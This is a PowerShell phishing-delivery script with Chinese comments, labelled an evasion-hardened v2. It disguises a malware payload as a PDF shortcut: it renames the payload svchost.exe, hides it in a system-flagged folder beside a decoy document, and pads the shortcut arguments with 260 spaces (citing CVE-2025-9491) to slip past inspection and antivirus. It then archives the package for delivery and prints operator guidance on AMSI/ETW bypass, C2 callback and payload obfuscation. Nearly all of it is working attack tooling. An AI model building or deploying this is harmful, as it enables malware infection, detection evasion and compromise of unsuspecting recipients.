# Fish LNK钓鱼投递脚本 v2 (免杀加固版)
# 核心改进:
#   1. CVE-2025-9491: LNK参数260字符后隐藏真实命令
#   2. 消除cmd.exe/bat中间层: LNK → 直接执行payload + 诱饵
#   3. 目录名无害化: 不用__MACOSX（已知IOC）
#   4. payload重命名为无害名称
# 用法: .\phish.ps1 -ExePath .\fish.exe -DecoyName "报告.pdf" -IconType "pdf"

param(
    [Parameter(Mandatory=$true)]
    [string]$ExePath,
    [string]$DecoyName = "报告.pdf",
    [string]$DecoyContent = "",
    [string]$IconType = "pdf",
    [string]$OutputName = "report",
    [string]$ResDir = ".assets",
    [switch]$KeepWorking = $false
)

$ErrorActionPreference = "Stop"

if (-not (Test-Path $ExePath)) {
    Write-Host "[!] payload不存在: $ExePath" -ForegroundColor Red
    exit 1
}

$workDir = Join-Path $env:TEMP "fish_lnk_$(Get-Random)"

Write-Host "[+] Fish LNK钓鱼工具 v2 (免杀加固)" -ForegroundColor Cyan
Write-Host "[+] 工作目录: $workDir"

# ============================================
# 第1步: 创建目录 + 复制文件
# ============================================
Write-Host "[+] 创建目录结构..."

$resPath = Join-Path $workDir $ResDir
New-Item -ItemType Directory -Path $resPath -Force | Out-Null

# payload重命名（无害名称）
$payloadName = "svchost.exe"
Copy-Item $ExePath (Join-Path $resPath $payloadName)

# 诱饵文件
$decoyPath = Join-Path $resPath $DecoyName
if ($DecoyContent -ne "") {
    Set-Content -Path $decoyPath -Value $DecoyContent -Encoding UTF8
} else {
    # 默认PDF内容（占位，实际替换为真实PDF）
    $defaultDecoy = "Fish C2 Decoy Document - Replace with real PDF"
    Set-Content -Path $decoyPath -Value $defaultDecoy -Encoding UTF8
}

Write-Host "[+] 目录结构:" -ForegroundColor Green
Write-Host "  $OutputName.lnk  (伪装为 $IconType)"
Write-Host "  $ResDir\"
Write-Host "    ├── $DecoyName (诱饵)"
Write-Host "    └── $payloadName (payload)"

# ============================================
# 第2步: 生成LNK（CVE-2025-9491加固）
# ============================================
Write-Host "[+] 生成LNK快捷方式 (CVE-2025-9491参数隐藏)..."

$lnkPath = Join-Path $workDir "$OutputName.lnk"

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($lnkPath)

# 关键改进：LNK目标指向payload本身（不再经过cmd.exe/bat）
# payload内部已集成: AMSI bypass → ETW bypass → 释放PDF → C2上线
$shortcut.TargetPath = Join-Path $ResDir $payloadName

# CVE-2025-9491: 260字符空白填充后隐藏参数
# Properties对话框只显示前260字符，之后的内容不可见
# 这里参数为空（payload内部处理PDF释放），但填充空格防止AV解析
$padding = " " * 260  # 260字符空白填充
$shortcut.Arguments = $padding

$shortcut.WindowStyle = 7  # SW_SHOWMINNOACTIVE

# 图标映射（无害化）
$iconMap = @{
    "pdf"    = "$env:SystemRoot\System32\shell32.dll,68"
    "txt"    = "$env:SystemRoot\System32\shell32.dll,70"
    "doc"    = "$env:SystemRoot\System32\shell32.dll,42"
    "xls"    = "$env:SystemRoot\System32\shell32.dll,120"
    "folder" = "$env:SystemRoot\System32\shell32.dll,3"
}

if ($iconMap.ContainsKey($IconType)) {
    $shortcut.IconLocation = $iconMap[$IconType]
} else {
    $shortcut.IconLocation = $iconMap["pdf"]
}

$shortcut.Description = $DecoyName
$shortcut.Save()

Write-Host "[+] LNK已生成: $lnkPath" -ForegroundColor Green
Write-Host "    目标: $ResDir\$payloadName (直接指向payload,无中间层)"
Write-Host "    参数: 260字符空白填充 (CVE-2025-9491)"
Write-Host "    图标: $IconType"

# ============================================
# 第3步: 设置隐藏属性
# ============================================
Write-Host "[+] 设置隐藏属性..."

$resItem = Get-Item $resPath -Force
$resItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Directory

Get-ChildItem $resPath -Recurse -Force | ForEach-Object {
    $_.Attributes = $_.Attributes -bor [System.IO.FileAttributes]::Hidden
}

Write-Host "[+] 隐藏属性已设置" -ForegroundColor Green

# ============================================
# 第4步: 7-Zip打包
# ============================================
Write-Host "[+] 打包压缩文件..."

$output7z = Join-Path (Get-Location) "$OutputName.7z"
$outputZip = Join-Path (Get-Location) "$OutputName.zip"

$sevenZip = $null
$sevenZipPaths = @(
    "C:\Program Files\7-Zip\7z.exe",
    "C:\Program Files (x86)\7-Zip\7z.exe",
    (Get-Command 7z -ErrorAction SilentlyContinue).Source
)

foreach ($p in $sevenZipPaths) {
    if ($p -and (Test-Path $p)) { $sevenZip = $p; break }
}

if ($sevenZip) {
    Push-Location $workDir
    & $sevenZip a -r $output7z "." | Out-Null
    Pop-Location
    Write-Host "[+] 7z压缩包: $output7z" -ForegroundColor Green
} else {
    Compress-Archive -Path "$workDir\*" -DestinationPath $outputZip -Force
    Write-Host "[+] ZIP压缩包: $outputZip (警告:可能丢失隐藏属性)" -ForegroundColor Yellow
}

# ============================================
# 第5步: 清理
# ============================================
if (-not $KeepWorking) {
    Get-ChildItem $resPath -Recurse -Force | ForEach-Object {
        $_.Attributes = [System.IO.FileAttributes]::Normal
    }
    $resItem.Attributes = [System.IO.FileAttributes]::Normal
    Remove-Item $workDir -Recurse -Force
    Write-Host "[+] 工作目录已清理" -ForegroundColor Green
} else {
    Write-Host "[*] 工作目录保留: $workDir" -ForegroundColor Yellow
}

# ============================================
# 投递指引
# ============================================
Write-Host ""
Write-Host "========== 投递指引 ==========" -ForegroundColor Cyan
Write-Host ""
Write-Host "攻击链: LNK → payload.exe (内部: AMSI/ETW bypass → 释放PDF → C2上线)"
Write-Host ""
Write-Host "免杀加固:"
Write-Host "  - 无cmd.exe/bat中间层 (消除LNK→cmd检测特征)"
Write-Host "  - CVE-2025-9491参数隐藏 (260字符空白填充)"
Write-Host "  - payload重命名svchost.exe"
Write-Host "  - 目录名无害化(.assets, 不用__MACOSX)"
Write-Host "  - payload内集成AMSI+ETW bypass"
Write-Host ""
Write-Host "注意事项:"
Write-Host "  - payload必须集成PDF释放逻辑(//go:embed decoy.pdf)"
Write-Host "  - 使用 garble -tiny -literals -controlflow 编译payload"
Write-Host "  - 7z格式保留隐藏属性, ZIP可能失效"
Write-Host "================================" -ForegroundColor Cyan
